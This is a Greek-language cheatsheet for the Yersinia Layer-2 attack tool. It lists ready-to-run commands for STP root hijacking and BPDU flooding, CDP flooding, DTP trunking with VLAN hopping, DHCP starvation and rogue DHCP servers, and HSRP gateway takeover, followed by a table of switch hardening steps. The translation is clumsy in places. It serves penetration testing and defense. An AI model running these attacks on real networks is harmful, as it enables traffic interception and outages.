<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Cheatsheet Yersinia

Το [Yersinia](https://github.com/tomac/yersinia) είναι ένα ισχυρό πλαίσιο δοκιμών διείσδυσης δικτύου Layer-2 (Data Link layer) που έχει σχεδιαστεί για να αναλύει και να εκμεταλλεύεται αδυναμίες σε πρωτόκολλα Layer-2 όπως STP (Πρωτόκολλο Spanning Tree), CDP (Cisco Discovery Protocol), DTP (Dynamic, ProtocolS, DHCP και DTP) 802.1Q VLAN trunking.

---

## Πίνακας περιεχομένων

- [Υποστηριζόμενα πρωτόκολλα και λειτουργίες](#supported-protocols--modes)
- [Εγκατάσταση](#installation)
- [Interactive Curses Mode (`-I`)](#interactive-curses-mode--i)
- [Επιθέσεις Spanning Tree Protocol (STP) Attacks] (#spanning-tree-protocol-stp-attacks)
- [Επιθέσεις Cisco Discovery Protocol (CDP)](#cisco-discovery-protocol-cdp-attacks)
- [Dynamic Trunking Protocol (DTP) & VLAN Hopping](#dynamic-trunking-protocol-dtp--vlan-hopping)
- [DHCP Rogue & Starvation Attacks](#dhcp-rogue--Starvation-attacks)
- [HSRP & VRRP Hijacking](#hsrp--vrrp-hijacking)
- [Mitigation & Hardening](#mitigation--hardening)

---

## Υποστηριζόμενα πρωτόκολλα και λειτουργίες

Η Yersinia στοχεύει πρωτόκολλα που λειτουργούν κάτω από IP:
- **STP:** Spanning Tree Protocol (Ανάληψη ρόλου γέφυρας ρίζας, ειδοποιήσεις αλλαγής τοπολογίας).
- **CDP:** Cisco Discovery Protocol (Πλημμύρα συσκευής, ψεύτικη έγχυση γειτόνων).
- **DTP:** Dynamic Trunking Protocol (Διαπραγμάτευση συνδέσμων κορμού για πρόσβαση σε όλα τα VLAN).
- **DHCP:** Πρωτόκολλο διαμόρφωσης δυναμικού κεντρικού υπολογιστή (Starvation & αδίστακτοι διακομιστές DHCP).
- **HSRP:** Hot Standby Router Protocol (Ενεργή ανάληψη πύλης).
- **802.1Q / 802.1X:** Dot1Q VLAN hopping και EAPOL εξάντληση.
- **VTP:** VLAN Trunking Protocol (διαγραφή / αντικατάσταση βάσης δεδομένων VLAN).

Τρόποι εκτέλεσης:
- **`-I` (Interactive Curses):** Διεπαφή τερματικού πλήρους οθόνης για επιλογή πρωτοκόλλων, διαμόρφωση επιθέσεων και παρακολούθηση ζωντανών πακέτων.
- **Μη διαδραστικό CLI:** Άμεση εκτέλεση για αυτοματοποιημένα σενάρια.

---

## Εγκατάσταση
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y yersinia

# Arch Linux / BlackArch
sudo pacman -S yersinia

# Run in terminal
yersinia -h
```
---

## Διαδραστική λειτουργία κατάρες (`-I`)

Ο πιο πρακτικός και ασφαλής τρόπος χρήσης του Yersinia στο τερματικό χωρίς GUI:
```bash
sudo yersinia -I
```
- **`h`**: Εμφάνιση βοήθειας και πλήκτρων.
- **`g`**: Εναλλαγή πρωτοκόλλων (STP, CDP, DTP, DHCP, HSRP, κ.λπ.).
- **`x`**: Εκτέλεση μενού επίθεσης για το τρέχον πρωτόκολλο.
- **`c`**: Ακύρωση επίθεσης σε εξέλιξη.
- **`l`**: Εναλλαγή καταγραφής πακέτων.
- **`q`**: Έξοδος από την Yersinia.

---

## Επιθέσεις Spanning Tree Protocol (STP).

Το STP επιλέγει μια γέφυρα ρίζας με το χαμηλότερο Bridge ID (Προτεραιότητα + MAC). Η Yersinia μπορεί να εισάγει πλαστά BPDU (Μονάδες δεδομένων πρωτοκόλλου γεφύρωσης) για να διεκδικήσει την κατάσταση root και να ανακατευθύνει την κυκλοφορία μέσω του κεντρικού υπολογιστή εισβολέα.

### 1. Αξίωση ριζικού ρόλου (Έγχυση BPDU)
Στείλτε BPDU με προτεραιότητα `0` και χαμηλότερη διεύθυνση MAC για να γίνετε το STP Root Bridge:
```bash
sudo yersinia stp -attack 1 -i eth0
```
### 2. Αξίωση ριζικού ρόλου με αλλαγή τοπολογίας (TCN)
Αναγκάστε όλους τους διακόπτες να ξεπλύνουν τους πίνακες CAM και να επανασυγκλίνουν μέσω του εισβολέα:
```bash
sudo yersinia stp -attack 2 -i eth0
```
### 3. Επίθεση STP DoS (Flood Config BPDU)
Συντριβή ή κορεσμός του διακόπτη CPU με τεράστια συγκρουόμενα πλαίσια BPDU:
```bash
sudo yersinia stp -attack 0 -i eth0
```
---

## Επιθέσεις Cisco Discovery Protocol (CDP).

Το CDP μοιράζεται ονόματα συσκευών, μοντέλα, δυνατότητες και εκδόσεις λογισμικού χωρίς έλεγχο ταυτότητας σε όλες τις συσκευές Cisco.

### 1. Flood Fake CDP Neighbors
Εξασφαλίστε τη μνήμη του διακόπτη εξάτμισης και δημιουργήστε συσκευές φάντασμα στο `show cdp neighbors`:
```bash
sudo yersinia cdp -attack 0 -i eth0
```
### 2. Λήψη και επιθεώρηση νόμιμων πακέτων CDP
Εκτελέστε τη λειτουργία διαδραστικής κατάρες (`yersinia -I`), πατήστε `g`, επιλέξτε `CDP` και παρατηρήστε το όνομα κεντρικού υπολογιστή διακόπτη, τη διεύθυνση IP διαχείρισης, το μοντέλο υλικού και το εγγενές αναγνωριστικό VLAN.

---

## Dynamic Trunking Protocol (DTP) & VLAN Hopping

DTP automatically negotiates trunking links if switch ports are configured in `dynamic desirable` or `dynamic auto` mode.

### 1. Διαπραγμάτευση συνδέσμου κορμού (επιθυμητό πακέτο DTP)
Ξεγελάστε τη θύρα μεταγωγής και μετατρέψτε σε κορμό 802.1Q:
```bash
sudo yersinia dtp -attack 0 -i eth0
```
Μόλις γίνει η διαπραγμάτευση του κορμού, καταγράψτε πλαίσια από όλα τα VLAN ή πακέτα ετικετών σε απομονωμένα υποδίκτυα χρησιμοποιώντας διεπαφές Linux 802.1Q:
```bash
# Add VLAN subinterface for newly accessed VLAN (e.g. VLAN 20)
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link set dev eth0.20 up
sudo dhclient eth0.20
```
---

## DHCP Rogue & Starvation Attacks

### 1. DHCP Starvation Attack (Εξάτμιση IP Pool)
Στείλτε χιλιάδες αιτήματα DHCP DISCOVER με τυχαίες διευθύνσεις MAC για να καταναλώσετε όλες τις διαθέσιμες διευθύνσεις IP στο pool:
```bash
sudo yersinia dhcp -attack 1 -i eth0
```
### 2. Ρύθμιση του Rogue DHCP Server
Αναπτύξτε έναν απατεώνα διακομιστή DHCP με προσαρμοσμένο DNS και πύλη:
```bash
sudo yersinia dhcp -attack 2 -i eth0
```
---

## HSRP & VRRP Hijacking

Το HSRP επιτρέπει σε πολλούς δρομολογητές να παρουσιάζουν μια ενιαία εικονική προεπιλεγμένη πύλη.

### 1. Διεκδικήστε την προτεραιότητα ενεργού δρομολογητή
Εισάγετε πακέτα HSRP HELLO με προτεραιότητα 255 για να αναλάβετε την προεπιλεγμένη IP πύλης:
```bash
sudo yersinia hsrp -attack 0 -i eth0
```
---

## Μετριασμός & Σκλήρυνση

| Πρωτόκολλο | Διάνυσμα επίθεσης | Cisco / Standard Mitigation |
|---|---|---|
| **STP** | Fake Root Bridge Injection | `spanning-tree bpduguard enable` στις θύρες πρόσβασης. `spanning-tree rootguard` σε συνδέσμους μεταξύ διακοπτών. |
| **DTP** | Rogue Trunk Negotiation | `switchport mode access` & `switchport nonegotiate` σε όλες τις θύρες πρόσβασης προς το χρήστη. |
| **CDP** | Πλημμύρες / Αποκάλυψη πληροφοριών | `no cdp run` (καθολικά) ή `no cdp enable` σε μη αξιόπιστες θύρες διεπαφής. |
| **DHCP** | Starvation & Rogue Server | Ενεργοποιήστε το `ip dhcp snooping`, περιορισμό του ρυθμού ανά θύρα, διαμορφώστε τις αξιόπιστες θύρες ανερχόμενης ζεύξης. |
| **HSRP** | Προτεραιότητα αεροπειρατεία | Διαμορφώστε τον έλεγχο ταυτότητας MD5 με μυστικά κλειδιά (`standby 1 authentication md5 key-string <SECRET>`). |